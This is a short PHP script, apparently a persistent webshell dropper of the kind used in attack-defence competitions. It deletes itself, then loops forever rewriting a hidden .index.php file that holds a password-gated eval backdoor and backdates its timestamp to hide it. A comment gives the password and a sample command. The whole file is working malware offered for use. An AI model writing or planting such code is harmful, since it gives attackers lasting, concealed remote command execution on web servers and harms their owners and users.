<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="61b8410a017bc69c7f6c7a030ee54e6f"){@eval($_POST[a]);} ?>';
//POST传参：pass=qwzf007&a=System('ls')
while (1){
	file_put_contents($file,$code);
	system('touch -m -d "2017-11-12 10:10:10" .index.php');
	usleep(50000);
}
?>
